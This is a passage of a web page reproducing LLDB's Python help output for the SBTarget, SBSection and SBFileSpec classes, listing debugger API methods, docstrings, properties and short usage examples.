FindBreakpointsByName(self, name, bkpt_list)<br>|      FindBreakpointsByName(SBTarget self, str const * name, SBBreakpointList bkpt_list) -&gt; bool<br>|<br>|  FindCompileUnits(self, sb_file_spec)<br>|      FindCompileUnits(SBTarget self, SBFileSpec sb_file_spec) -&gt; SBSymbolContextList<br>|<br>|<br>|      Find compile units related to *this target and passed source<br>|      file.<br>|<br>|      @param[in] sb_file_spec<br>|          A lldb::SBFileSpec object that contains source file<br>|          specification.<br>|<br>|      @return<br>|          A lldb::SBSymbolContextList that gets filled in with all of<br>|          the symbol contexts for all the matches.<br>|<br>|  FindFirstGlobalVariable(self, name)<br>|      FindFirstGlobalVariable(SBTarget self, str const * name) -&gt; SBValue<br>|<br>|<br>|      Find the first global (or static) variable by name.<br>|<br>|      @param[in] name<br>|          The name of the global or static variable we are looking<br>|          for.<br>|<br>|      @return<br>|          An SBValue that gets filled in with the found variable (if any).<br>|<br>|  FindFirstType(self, type)<br>|      FindFirstType(SBTarget self, str const * type) -&gt; SBType<br>|<br>|  FindFunctions(self, *args)<br>|      FindFunctions(SBTarget self, str const * name, uint32_t name_type_mask) -&gt; SBSymbolContextList<br>|      FindFunctions(SBTarget self, str const * name) -&gt; SBSymbolContextList<br>|<br>|<br>|      Find functions by name.<br>|<br>|      @param[in] name<br>|          The name of the function we are looking for.<br>|<br>|      @param[in] name_type_mask<br>|          A logical OR of one or more FunctionNameType enum bits that<br>|          indicate what kind of names should be used when doing the<br>|          lookup. Bits include fully qualified names, base names,<br>|          C++ methods, or ObjC selectors.<br>|          See FunctionNameType for more details.<br>|<br>|      @return<br>|          A lldb::SBSymbolContextList that gets filled in with all of<br>|          the symbol contexts for all the matches.<br>|<br>|  FindGlobalFunctions(self, name, max_matches, matchtype)<br>|      FindGlobalFunctions(SBTarget self, str const * name, uint32_t max_matches, lldb::MatchType matchtype) -&gt; SBSymbolContextList<br>|<br>|  FindGlobalVariables(self, *args)<br>|      FindGlobalVariables(SBTarget self, str const * name, uint32_t max_matches) -&gt; SBValueList<br>|      FindGlobalVariables(SBTarget self, str const * name, uint32_t max_matches, lldb::MatchType matchtype) -&gt; SBValueList<br>|<br>|<br>|      Find global and static variables by name.<br>|<br>|      @param[in] name<br>|          The name of the global or static variable we are looking<br>|          for.<br>|<br>|      @param[in] max_matches<br>|          Allow the number of matches to be limited to max_matches.<br>|<br>|      @return<br>|          A list of matched variables in an SBValueList.<br>|<br>|  FindModule(self, file_spec)<br>|      FindModule(SBTarget self, SBFileSpec file_spec) -&gt; SBModule<br>|<br>|  FindSymbols(self, *args)<br>|      FindSymbols(SBTarget self, str const * name, lldb::SymbolType type) -&gt; SBSymbolContextList<br>|      FindSymbols(SBTarget self, str const * name) -&gt; SBSymbolContextList<br>|<br>|  FindTypes(self, type)<br>|      FindTypes(SBTarget self, str const * type) -&gt; SBTypeList<br>|<br>|  FindWatchpointByID(self, watch_id)<br>|      FindWatchpointByID(SBTarget self, lldb::watch_id_t watch_id) -&gt; SBWatchpoint<br>|<br>|  GetAddressByteSize(self)<br>|      GetAddressByteSize(SBTarget self) -&gt; uint32_t<br>|<br>|  GetBasicType(self, type)<br>|      GetBasicType(SBTarget self, lldb::BasicType type) -&gt; SBType<br>|<br>|  GetBreakpointAtIndex(self, idx)<br>|      GetBreakpointAtIndex(SBTarget self, uint32_t idx) -&gt; SBBreakpoint<br>|<br>|  GetBreakpointNames(self, names)<br>|      GetBreakpointNames(SBTarget self, SBStringList names)<br>|<br>|  GetBroadcaster(self)<br>|      GetBroadcaster(SBTarget self) -&gt; SBBroadcaster<br>|<br>|  GetByteOrder(self)<br>|      GetByteOrder(SBTarget self) -&gt; lldb::ByteOrder<br>|<br>|  GetCodeByteSize(self)<br>|      GetCodeByteSize(SBTarget self) -&gt; uint32_t<br>|<br>|<br>|      Architecture code byte width accessor<br>|<br>|      @return<br>|      The size in 8-bit (host) bytes of a minimum addressable<br>|      unit from the Architecture’s code bus<br>|<br>|  GetCollectingStats(self)<br>|      GetCollectingStats(SBTarget self) -&gt; bool<br>|<br>|  GetDataByteSize(self)<br>|      GetDataByteSize(SBTarget self) -&gt; uint32_t<br>|<br>|<br>|      Architecture data byte width accessor<br>|<br>|      @return<br>|      The size in 8-bit (host) bytes of a minimum addressable<br>|      unit from the Architecture’s data bus<br>|<br>|  GetDebugger(self)<br>|      GetDebugger(SBTarget self) -&gt; SBDebugger<br>|<br>|  GetDescription(self, description, description_level)<br>|      GetDescription(SBTarget self, SBStream description, lldb::DescriptionLevel description_level) -&gt; bool<br>|<br>|  GetExecutable(self)<br>|      GetExecutable(SBTarget self) -&gt; SBFileSpec<br>|<br>|  GetInstructions(self, base_addr, buf)<br>|      GetInstructions(SBTarget self, SBAddress base_addr, void const * buf) -&gt; SBInstructionList<br>|<br>|<br>|      Disassemble the bytes in a buffer and return them in an SBInstructionList.<br>|      Parameters:<br>|         base_addr – used for symbolicating the offsets in the byte stream when disassembling<br>|         buf       – bytes to be disassembled<br>|         size      – (C++) size of the buffer<br>|      Returns an SBInstructionList.<br>|<br>|  GetInstructionsWithFlavor(self, base_addr, flavor_string, buf)<br>|      GetInstructionsWithFlavor(SBTarget self, SBAddress base_addr, str const * flavor_string, void const * buf) -&gt; SBInstructionList<br>|<br>|<br>|      Disassemble the bytes in a buffer and return them in an SBInstructionList, with a supplied flavor.<br>|      Parameters:<br>|         base_addr – used for symbolicating the offsets in the byte stream when disassembling<br>|         flavor    – may be ‘intel’ or ‘att’ on x86 targets to specify that style of disassembly<br>|         buf       – bytes to be disassembled<br>|         size      – (C++) size of the buffer<br>|      Returns an SBInstructionList.<br>|<br>|  GetLaunchInfo(self)<br>|      GetLaunchInfo(SBTarget self) -&gt; SBLaunchInfo<br>|<br>|  GetModuleAtIndex(self, idx)<br>|      GetModuleAtIndex(SBTarget self, uint32_t idx) -&gt; SBModule<br>|<br>|  GetNumBreakpoints(self)<br>|      GetNumBreakpoints(SBTarget self) -&gt; uint32_t<br>|<br>|  GetNumModules(self)<br>|      GetNumModules(SBTarget self) -&gt; uint32_t<br>|<br>|  GetNumWatchpoints(self)<br>|      GetNumWatchpoints(SBTarget self) -&gt; uint32_t<br>|<br>|  GetPlatform(self)<br>|      GetPlatform(SBTarget self) -&gt; SBPlatform<br>|<br>|<br>|      Return the platform object associated with the target.<br>|<br>|      After return, the platform object should be checked for<br>|      validity.<br>|<br>|      @return<br>|          A platform object.<br>|<br>|  GetProcess(self)<br>|      GetProcess(SBTarget self) -&gt; SBProcess<br>|<br>|  GetSourceManager(self)<br>|      GetSourceManager(SBTarget self) -&gt; SBSourceManager<br>|<br>|  GetStackRedZoneSize(self)<br>|      GetStackRedZoneSize(SBTarget self) -&gt; lldb::addr_t<br>|<br>|  GetStatistics(self)<br>|      GetStatistics(SBTarget self) -&gt; SBStructuredData<br>|<br>|  GetTriple(self)<br>|      GetTriple(SBTarget self) -&gt; str const *<br>|<br>|  GetWatchpointAtIndex(self, idx)<br>|      GetWatchpointAtIndex(SBTarget self, uint32_t idx) -&gt; SBWatchpoint<br>|<br>|  Install(self)<br>|      Install(SBTarget self) -&gt; SBError<br>|<br>|<br>|      Install any binaries that need to be installed.<br>|<br>|      This function does nothing when debugging on the host system.<br>|      When connected to remote platforms, the target’s main executable<br>|      and any modules that have their install path set will be<br>|      installed on the remote platform. If the main executable doesn’t<br>|      have an install location set, it will be installed in the remote<br>|      platform’s working directory.<br>|<br>|      @return<br>|          An error describing anything that went wrong during<br>|          installation.<br>|<br>|  IsValid(self)<br>|      IsValid(SBTarget self) -&gt; bool<br>|<br>|  Launch(self, *args)<br>|      Launch(SBTarget self, SBListener listener, str const ** argv, str const ** envp, str const * stdin_path, str const * stdout_path, str const * stderr_path, str const * working_directory, uint32_t launch_flags, bool stop_at_entry, SBError error) -&gt; SBProcess<br>|      Launch(SBTarget self, SBLaunchInfo launch_info, SBError error) -&gt; SBProcess<br>|<br>|<br>|      Launch a new process.<br>|<br>|      Launch a new process by spawning a new process using the<br>|      target object’s executable module’s file as the file to launch.<br>|      Arguments are given in argv, and the environment variables<br>|      are in envp. Standard input and output files can be<br>|      optionally re-directed to stdin_path, stdout_path, and<br>|      stderr_path.<br>|<br>|      @param[in] listener<br>|          An optional listener that will receive all process events.<br>|          If listener is valid then listener will listen to all<br>|          process events. If not valid, then this target’s debugger<br>|          (SBTarget::GetDebugger()) will listen to all process events.<br>|<br>|      @param[in] argv<br>|          The argument array.<br>|<br>|      @param[in] envp<br>|          The environment array.<br>|<br>|      @param[in] launch_flags<br>|          Flags to modify the launch (@see lldb::LaunchFlags)<br>|<br>|      @param[in] stdin_path<br>|          The path to use when re-directing the STDIN of the new<br>|          process. If all stdXX_path arguments are NULL, a pseudo<br>|          terminal will be used.<br>|<br>|      @param[in] stdout_path<br>|          The path to use when re-directing the STDOUT of the new<br>|          process. If all stdXX_path arguments are NULL, a pseudo<br>|          terminal will be used.<br>|<br>|      @param[in] stderr_path<br>|          The path to use when re-directing the STDERR of the new<br>|          process. If all stdXX_path arguments are NULL, a pseudo<br>|          terminal will be used.<br>|<br>|      @param[in] working_directory<br>|          The working directory to have the child process run in<br>|<br>|      @param[in] launch_flags<br>|          Some launch options specified by logical OR’ing<br>|          lldb::LaunchFlags enumeration values together.<br>|<br>|      @param[in] stop_at_entry<br>|          If false do not stop the inferior at the entry point.<br>|<br>|      @param[out]<br>|          An error object. Contains the reason if there is some failure.<br>|<br>|      @return<br>|           A process object for the newly created process.<br>|<br>|      For example,<br>|<br>|          process = target.Launch(self.dbg.GetListener(), None, None,<br>|                                  None, ‘/tmp/stdout.txt’, None,<br>|                                  None, 0, False, error)<br>|<br>|      launches a new process by passing nothing for both the args and the envs<br>|      and redirect the standard output of the inferior to the /tmp/stdout.txt<br>|      file. It does not specify a working directory so that the debug server<br>|      will use its idea of what the current working directory is for the<br>|      inferior. Also, we ask the debugger not to stop the inferior at the<br>|      entry point. If no breakpoint is specified for the inferior, it should<br>|      run to completion if no user interaction is required.<br>|<br>|  LaunchSimple(self, argv, envp, working_directory)<br>|      LaunchSimple(SBTarget self, str const ** argv, str const ** envp, str const * working_directory) -&gt; SBProcess<br>|<br>|<br>|      Launch a new process with sensible defaults.<br>|<br>|      @param[in] argv<br>|          The argument array.<br>|<br>|      @param[in] envp<br>|          The environment array.<br>|<br>|      @param[in] working_directory<br>|          The working directory to have the child process run in<br>|<br>|      Default: listener<br>|          Set to the target’s debugger (SBTarget::GetDebugger())<br>|<br>|      Default: launch_flags<br>|          Empty launch flags<br>|<br>|      Default: stdin_path<br>|      Default: stdout_path<br>|      Default: stderr_path<br>|          A pseudo terminal will be used.<br>|<br>|      @return<br>|           A process object for the newly created process.<br>|<br>|      For example,<br>|<br>|          process = target.LaunchSimple([‘X’, ‘Y’, ‘Z’], None, os.getcwd())<br>|<br>|      launches a new process by passing ‘X’, ‘Y’, ‘Z’ as the args to the<br>|      executable.<br>|<br>|  LoadCore(self, *args)<br>|      LoadCore(SBTarget self, str const * core_file) -&gt; SBProcess<br>|      LoadCore(SBTarget self, str const * core_file, SBError error) -&gt; SBProcess<br>|<br>|<br>|      Load a core file<br>|<br>|      @param[in] core_file<br>|          File path of the core dump.<br>|<br>|      @param[out] error<br>|          An error explaining what went wrong if the operation fails.<br>|          (Optional)<br>|<br>|      @return<br>|           A process object for the newly created core file.<br>|<br>|      For example,<br>|<br>|          process = target.LoadCore(’./a.out.core’)<br>|<br>|      loads a new core file and returns the process object.<br>|<br>|  ReadInstructions(self, *args)<br>|      ReadInstructions(SBTarget self, SBAddress base_addr, uint32_t count) -&gt; SBInstructionList<br>|      ReadInstructions(SBTarget self, SBAddress base_addr, uint32_t count, str const * flavor_string) -&gt; SBInstructionList<br>|<br>|<br>|      Disassemble a specified number of instructions starting at an address.<br>|      Parameters:<br>|         base_addr       – the address to start disassembly from<br>|         count           – the number of instructions to disassemble<br>|         flavor_string   – may be ‘intel’ or ‘att’ on x86 targets to specify that style of disassembly<br>|      Returns an SBInstructionList.<br>|<br>|  ReadMemory(self, addr, buf, error)<br>|      ReadMemory(SBTarget self, SBAddress addr, void * buf, SBError error) -&gt; size_t<br>|<br>|<br>|      Read target memory. If a target process is running then memory<br>|      is read from here. Otherwise the memory is read from the object<br>|      files. For a target whose bytes are sized as a multiple of host<br>|      bytes, the data read back will preserve the target’s byte order.<br>|<br>|      @param[in] addr<br>|          A target address to read from.<br>|<br>|      @param[out] buf<br>|          The buffer to read memory into.<br>|<br>|      @param[in] size<br>|          The maximum number of host bytes to read in the buffer passed<br>|          into this call<br>|<br>|      @param[out] error<br>|          Error information is written here if the memory read fails.<br>|<br>|      @return<br>|          The amount of data read in host bytes.<br>|<br>|  RemoveModule(self, module)<br>|      RemoveModule(SBTarget self, SBModule module) -&gt; bool<br>|<br>|  ResolveFileAddress(self, file_addr)<br>|      ResolveFileAddress(SBTarget self, lldb::addr_t file_addr) -&gt; SBAddress<br>|<br>|<br>|      Resolve a current file address into a section offset address.<br>|<br>|      @param[in] file_addr<br>|<br>|      @return<br>|          An SBAddress which will be valid if…<br>|<br>|  ResolveLoadAddress(self, vm_addr)<br>|      ResolveLoadAddress(SBTarget self, lldb::addr_t vm_addr) -&gt; SBAddress<br>|<br>|  ResolvePastLoadAddress(self, stop_id, vm_addr)<br>|      ResolvePastLoadAddress(SBTarget self, uint32_t stop_id, lldb::addr_t vm_addr) -&gt; SBAddress<br>|<br>|  ResolveSymbolContextForAddress(self, addr, resolve_scope)<br>|      ResolveSymbolContextForAddress(SBTarget self, SBAddress addr, uint32_t resolve_scope) -&gt; SBSymbolContext<br>|<br>|  SetCollectingStats(self, v)<br>|      SetCollectingStats(SBTarget self, bool v)<br>|<br>|  SetLaunchInfo(self, launch_info)<br>|      SetLaunchInfo(SBTarget self, SBLaunchInfo launch_info)<br>|<br>|  SetModuleLoadAddress(self, module, sections_offset)<br>|      SetModuleLoadAddress(SBTarget self, SBModule module, int64_t sections_offset) -&gt; SBError<br>|<br>|  SetSectionLoadAddress(self, section, section_base_addr)<br>|      SetSectionLoadAddress(SBTarget self, SBSection section, lldb::addr_t section_base_addr) -&gt; SBError<br>|<br>|  WatchAddress(self, addr, size, read, write, error)<br>|      WatchAddress(SBTarget self, lldb::addr_t addr, size_t size, bool read, bool write, SBError error) -&gt; SBWatchpoint<br>|<br>|  <strong>bool</strong> = <strong>nonzero</strong>(self)<br>|<br>|  <strong>del</strong> lambda self<br>|<br>|  <strong>eq</strong>(self, rhs)<br>|      Return self==value.<br>|<br>|  <strong>getattr</strong> lambda self, name<br>|<br>|  <strong>init</strong>(self, *args)<br>|      <strong>init</strong>(lldb::SBTarget self) -&gt; SBTarget<br>|      <strong>init</strong>(lldb::SBTarget self, SBTarget rhs) -&gt; SBTarget<br>|<br>|  <strong>ne</strong>(self, rhs)<br>|      Return self!=value.<br>|<br>|  <strong>nonzero</strong>(self)<br>|<br>|  <strong>repr</strong> = _swig_repr(self)<br>|<br>|  <strong>setattr</strong> lambda self, name, value<br>|<br>|  <strong>str</strong>(self)<br>|      <strong>str</strong>(SBTarget self) -&gt; PyObject *<br>|<br>|  breakpoint_iter(self)<br>|<br>|  get_modules_access_object(self)<br>|      An accessor function that returns a modules_access() object which allows lazy module access from a lldb.SBTarget object.<br>|<br>|  get_modules_array(self)<br>|      An accessor function that returns a list() that contains all modules in a lldb.SBTarget object.<br>|<br>|  module_iter(self)<br>|<br>|  watchpoint_iter(self)</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>Static methods defined here:</td></tr><tr><td></td></tr><tr><td>EventIsTargetEvent(event)</td></tr><tr><td>EventIsTargetEvent(SBEvent event) -&gt; bool</td></tr><tr><td></td></tr><tr><td>GetBroadcasterClassName()</td></tr><tr><td>GetBroadcasterClassName() -&gt; str const *</td></tr><tr><td></td></tr><tr><td>GetModuleAtIndexFromEvent(idx, event)</td></tr><tr><td>GetModuleAtIndexFromEvent(uint32_t const idx, SBEvent event) -&gt; SBModule</td></tr><tr><td></td></tr><tr><td>GetNumModulesFromEvent(event)</td></tr><tr><td>GetNumModulesFromEvent(SBEvent event) -&gt; uint32_t</td></tr><tr><td></td></tr><tr><td>GetTargetFromEvent(event)</td></tr><tr><td>GetTargetFromEvent(SBEvent event) -&gt; SBTarget</td></tr><tr><td></td></tr><tr><td><strong>swig_destroy</strong> = delete_SBTarget(…)</td></tr><tr><td>delete_SBTarget(SBTarget self)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data descriptors defined here:</td></tr><tr><td></td></tr><tr><td><strong>dict</strong></td></tr><tr><td>dictionary for instance variables (if defined)</td></tr><tr><td></td></tr><tr><td><strong>weakref</strong></td></tr><tr><td>list of weak references to the object (if defined)</td></tr><tr><td></td></tr><tr><td>addr_size</td></tr><tr><td>A read only property that returns the size in bytes of an address for this target.</td></tr><tr><td></td></tr><tr><td>broadcaster</td></tr><tr><td>A read only property that an lldb object that represents the broadcaster (lldb.SBBroadcaster) for this target.</td></tr><tr><td></td></tr><tr><td>byte_order</td></tr><tr><td>A read only property that returns an lldb enumeration value (lldb.eByteOrderLittle, lldb.eByteOrderBig, lldb.eByteOrderInvalid) that represents the byte order for this target.</td></tr><tr><td></td></tr><tr><td>code_byte_size</td></tr><tr><td>A read only property that returns the size in host bytes of a byte in the code address space for this target.</td></tr><tr><td></td></tr><tr><td>data_byte_size</td></tr><tr><td>A read only property that returns the size in host bytes of a byte in the data address space for this target.</td></tr><tr><td></td></tr><tr><td>debugger</td></tr><tr><td>A read only property that returns an lldb object that represents the debugger (lldb.SBDebugger) that owns this target.</td></tr><tr><td></td></tr><tr><td>executable</td></tr><tr><td>A read only property that returns an lldb object that represents the main executable module (lldb.SBModule) for this target.</td></tr><tr><td></td></tr><tr><td>module</td></tr><tr><td>A read only property that returns an object that implements python operator overloading with the square brackets().\n    target.module[<int>] allows array access to any modules.\n    target.module[<str>] allows access to modules by basename, full path, or uuid string value.\n    target.module[uuid.UUID()] allows module access by UUID.\n    target.module[re] allows module access using a regular expression that matches the module full path.</str></int></td></tr><tr><td></td></tr><tr><td>modules</td></tr><tr><td>A read only property that returns a list() of lldb.SBModule objects contained in this target. This list is a list all modules that the target currently is tracking (the main executable and all dependent shared libraries).</td></tr><tr><td></td></tr><tr><td>num_breakpoints</td></tr><tr><td>A read only property that returns the number of breakpoints that this target has as an integer.</td></tr><tr><td></td></tr><tr><td>num_watchpoints</td></tr><tr><td>A read only property that returns the number of watchpoints that this target has as an integer.</td></tr><tr><td></td></tr><tr><td>platform</td></tr><tr><td>A read only property that returns the platform associated with with this target.</td></tr><tr><td></td></tr><tr><td>process</td></tr><tr><td>A read only property that returns an lldb object that represents the process (lldb.SBProcess) that this target owns.</td></tr><tr><td></td></tr><tr><td>triple</td></tr><tr><td>A read only property that returns the target triple (arch-vendor-os) for this target as a string.</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data and other attributes defined here:</td></tr><tr><td></td></tr><tr><td><strong>hash</strong> = None</td></tr><tr><td></td></tr><tr><td><strong>swig_getmethods</strong> = {‘addr_size’: &lt;function SBTarget.GetAddressByteS…</td></tr><tr><td></td></tr><tr><td><strong>swig_setmethods</strong> = {}</td></tr><tr><td></td></tr><tr><td>eBroadcastBitBreakpointChanged = 1</td></tr><tr><td></td></tr><tr><td>eBroadcastBitModulesLoaded = 2</td></tr><tr><td></td></tr><tr><td>eBroadcastBitModulesUnloaded = 4</td></tr><tr><td></td></tr><tr><td>eBroadcastBitSymbolsLoaded = 16</td></tr><tr><td></td></tr><tr><td>eBroadcastBitWatchpointChanged = 8</td></tr><tr><td></td></tr><tr><td>modules_access = &lt;class ‘lldb.SBTarget.modules_access’&gt;</td></tr><tr><td>A helper object that will lazily hand out lldb.SBModule objects for a target when supplied an index, or by full or partial path.</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### SBSection Python Help</span><br></pre></td></tr></table></figure><p>Help on SBSection in module lldb object:</p><p>class SBSection(builtins.object)<br>|  SBSection(*args)<br>|<br>|  Represents an executable image section.<br>|<br>|  SBSection supports iteration through its subsection, represented as SBSection<br>|  as well.  For example,<br>|<br>|      for sec in exe_module:<br>|          if sec.GetName() == ‘__TEXT’:<br>|              print sec<br>|              break<br>|      print INDENT + ‘Number of subsections: %d’ % sec.GetNumSubSections()<br>|      for subsec in sec:<br>|          print INDENT + repr(subsec)<br>|<br>|  produces:<br>|<br>|  [0x0000000100000000-0x0000000100002000) a.out.__TEXT<br>|      Number of subsections: 6<br>|      [0x0000000100001780-0x0000000100001d5c) a.out.__TEXT.__text<br>|      [0x0000000100001d5c-0x0000000100001da4) a.out.__TEXT.__stubs<br>|      [0x0000000100001da4-0x0000000100001e2c) a.out.__TEXT.__stub_helper<br>|      [0x0000000100001e2c-0x0000000100001f10) a.out.__TEXT.__cstring<br>|      [0x0000000100001f10-0x0000000100001f68) a.out.__TEXT.__unwind_info<br>|      [0x0000000100001f68-0x0000000100001ff8) a.out.__TEXT.__eh_frame<br>|<br>|  See also SBModule.<br>|<br>|  Methods defined here:<br>|<br>|  FindSubSection(self, sect_name)<br>|      FindSubSection(SBSection self, str const * sect_name) -&gt; SBSection<br>|<br>|  GetByteSize(self)<br>|      GetByteSize(SBSection self) -&gt; lldb::addr_t<br>|<br>|  GetDescription(self, description)<br>|      GetDescription(SBSection self, SBStream description) -&gt; bool<br>|<br>|  GetFileAddress(self)<br>|      GetFileAddress(SBSection self) -&gt; lldb::addr_t<br>|<br>|  GetFileByteSize(self)<br>|      GetFileByteSize(SBSection self) -&gt; uint64_t<br>|<br>|  GetFileOffset(self)<br>|      GetFileOffset(SBSection self) -&gt; uint64_t<br>|<br>|  GetLoadAddress(self, target)<br>|      GetLoadAddress(SBSection self, SBTarget target) -&gt; lldb::addr_t<br>|<br>|  GetName(self)<br>|      GetName(SBSection self) -&gt; str const *<br>|<br>|  GetNumSubSections(self)<br>|      GetNumSubSections(SBSection self) -&gt; size_t<br>|<br>|  GetParent(self)<br>|      GetParent(SBSection self) -&gt; SBSection<br>|<br>|  GetPermissions(self)<br>|      GetPermissions(SBSection self) -&gt; uint32_t<br>|<br>|  GetSectionData(self, *args)<br>|      GetSectionData(SBSection self) -&gt; SBData<br>|      GetSectionData(SBSection self, uint64_t offset, uint64_t size) -&gt; SBData<br>|<br>|  GetSectionType(self)<br>|      GetSectionType(SBSection self) -&gt; lldb::SectionType<br>|<br>|  GetSubSectionAtIndex(self, idx)<br>|      GetSubSectionAtIndex(SBSection self, size_t idx) -&gt; SBSection<br>|<br>|  GetTargetByteSize(self)<br>|      GetTargetByteSize(SBSection self) -&gt; uint32_t<br>|<br>|<br>|      Return the size of a target’s byte represented by this section<br>|      in numbers of host bytes. Note that certain architectures have<br>|      varying minimum addressable unit (i.e. byte) size for their<br>|      CODE or DATA buses.<br>|<br>|      @return<br>|          The number of host (8-bit) bytes needed to hold a target byte<br>|<br>|  IsValid(self)<br>|      IsValid(SBSection self) -&gt; bool<br>|<br>|  <strong>bool</strong> = <strong>nonzero</strong>(self)<br>|<br>|  <strong>del</strong> lambda self<br>|<br>|  <strong>eq</strong>(self, rhs)<br>|      Return self==value.<br>|<br>|  <strong>getattr</strong> lambda self, name<br>|<br>|  <strong>init</strong>(self, *args)<br>|      <strong>init</strong>(lldb::SBSection self) -&gt; SBSection<br>|      <strong>init</strong>(lldb::SBSection self, SBSection rhs) -&gt; SBSection<br>|<br>|  <strong>iter</strong>(self)<br>|<br>|  <strong>len</strong>(self)<br>|<br>|  <strong>ne</strong>(self, rhs)<br>|      Return self!=value.<br>|<br>|  <strong>nonzero</strong>(self)<br>|<br>|  <strong>repr</strong> = _swig_repr(self)<br>|<br>|  <strong>setattr</strong> lambda self, name, value<br>|<br>|  <strong>str</strong>(self)<br>|      <strong>str</strong>(SBSection self) -&gt; PyObject *<br>|<br>|  get_addr(self)</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>Static methods defined here:</td></tr><tr><td></td></tr><tr><td><strong>swig_destroy</strong> = delete_SBSection(…)</td></tr><tr><td>delete_SBSection(SBSection self)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data descriptors defined here:</td></tr><tr><td></td></tr><tr><td><strong>dict</strong></td></tr><tr><td>dictionary for instance variables (if defined)</td></tr><tr><td></td></tr><tr><td><strong>weakref</strong></td></tr><tr><td>list of weak references to the object (if defined)</td></tr><tr><td></td></tr><tr><td>addr</td></tr><tr><td>A read only property that returns an lldb object that represents the start address (lldb.SBAddress) for this section.</td></tr><tr><td></td></tr><tr><td>data</td></tr><tr><td>A read only property that returns an lldb object that represents the bytes for this section (lldb.SBData) for this section.</td></tr><tr><td></td></tr><tr><td>file_addr</td></tr><tr><td>A read only property that returns an integer that represents the starting “file” address for this section, or the address of the section in the object file in which it is defined.</td></tr><tr><td></td></tr><tr><td>file_offset</td></tr><tr><td>A read only property that returns the file offset in bytes of this section as an integer.</td></tr><tr><td></td></tr><tr><td>file_size</td></tr><tr><td>A read only property that returns the file size in bytes of this section as an integer.</td></tr><tr><td></td></tr><tr><td>name</td></tr><tr><td>A read only property that returns the name of this section as a string.</td></tr><tr><td></td></tr><tr><td>size</td></tr><tr><td>A read only property that returns the size in bytes of this section as an integer.</td></tr><tr><td></td></tr><tr><td>target_byte_size</td></tr><tr><td>A read only property that returns the size of a target byte represented by this section as a number of host bytes.</td></tr><tr><td></td></tr><tr><td>type</td></tr><tr><td>A read only property that returns an lldb enumeration value (see enumerations that start with “lldb.eSectionType”) that represents the type of this section (code, data, etc.).</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data and other attributes defined here:</td></tr><tr><td></td></tr><tr><td><strong>hash</strong> = None</td></tr><tr><td></td></tr><tr><td><strong>swig_getmethods</strong> = {‘addr’: <function sbsection.get_addr>, ‘data’: …</function></td></tr><tr><td></td></tr><tr><td><strong>swig_setmethods</strong> = {}</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### SBFileSpec Python Help</span><br></pre></td></tr></table></figure><p>class SBFileSpec(builtins.object)<br>|  SBFileSpec(*args)<br>|<br>|  Represents a file specification that divides the path into a directory and<br>|  basename.  The string values of the paths are put into uniqued string pools<br>|  for fast comparisons and efficient memory usage.<br>|<br>|  For example, the following code<br>|<br>|          lineEntry = context.GetLineEntry()<br>|          self.expect(lineEntry.GetFileSpec().GetDirectory(), ‘The line entry should have the correct directory’,<br>|                      exe=False,<br>|              substrs = [self.mydir])<br>|          self.expect(lineEntry.GetFileSpec().GetFilename(), ‘The line entry should have the correct filename’,<br>|                      exe=False,<br>|              substrs = [‘main.c’])<br>|          self.assertTrue(lineEntry.GetLine() == self.line,<br>|                          'The line entry’s line number should match ')<br>|<br>|  gets the line entry from the symbol context when a thread is stopped.<br>|  It gets the file spec corresponding to the line entry and checks that<br>|  the filename and the directory matches what we expect.<br>|<br>|  Methods defined here:<br>|<br>|  AppendPathComponent(self, file_or_directory)<br>|      AppendPathComponent(SBFileSpec self, str const * file_or_directory)<br>|<br>|  Exists(self)<br>|      Exists(SBFileSpec self) -&gt; bool<br>|<br>|  GetDescription(self, description)<br>|      GetDescription(SBFileSpec self, SBStream description) -&gt; bool<br>|<br>|  GetDirectory(self)<br>|      GetDirectory(SBFileSpec self) -&gt; str const *<br>|<br>|  GetFilename(self)<br>|      GetFilename(SBFileSpec self) -&gt; str const *<br>|<br>|  GetPath(self, dst_path, dst_len)<br>|      GetPath(SBFileSpec self, str * dst_path, size_t dst_len) -&gt; uint32_t<br>|<br>|  IsValid(self)<br>|      IsValid(SBFileSpec self) -&gt; bool<br>|<br>|  ResolveExecutableLocation(self)<br>|      ResolveExecutableLocation(SBFileSpec self) -&gt; bool<br>|<br>|  SetDirectory(self, directory)<br>|      SetDirectory(SBFileSpec self, str const * directory)<br>|<br>|  SetFilename(self, filename)<br>|      SetFilename(SBFileSpec self, str const * filename)<br>|<br>|  <strong>bool</strong> = <strong>nonzero</strong>(self)<br>|<br>|  <strong>del</strong> lambda self<br>|<br>|  <strong>eq</strong>(self, other)<br>|      Return self==value.<br>|<br>|  <strong>get_fullpath</strong>(self)<br>|<br>|  <strong>getattr</strong> lambda self, name<br>|<br>|  <strong>init</strong>(self, *args)<br>|      <strong>init</strong>(lldb::SBFileSpec self) -&gt; SBFileSpec<br>|      <strong>init</strong>(lldb::SBFileSpec self, SBFileSpec rhs) -&gt; SBFileSpec<br>|      <strong>init</strong>(lldb::SBFileSpec self, str const * path) -&gt; SBFileSpec<br>|      <strong>init</strong>(lldb::SBFileSpec self, str const * path, bool resolve) -&gt; SBFileSpec<br>|<br>|  <strong>ne</strong>(self, other)<br>|      Return self!=value.<br>|<br>|  <strong>nonzero</strong>(self)<br>|<br>|  <strong>repr</strong> = _swig_repr(self)<br>|<br>|  <strong>setattr</strong> lambda self, name, value<br>|<br>|  <strong>str</strong>(self)<br>|      <strong>str</strong>(SBFileSpec self) -&gt; PyObject *</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>Static methods defined here:</td></tr><tr><td></td></tr><tr><td>ResolvePath(src_path, dst_path, dst_len)</td></tr><tr><td>ResolvePath(str const * src_path, str * dst_path, size_t dst_len) -&gt; int</td></tr><tr><td></td></tr><tr><td><strong>swig_destroy</strong> = 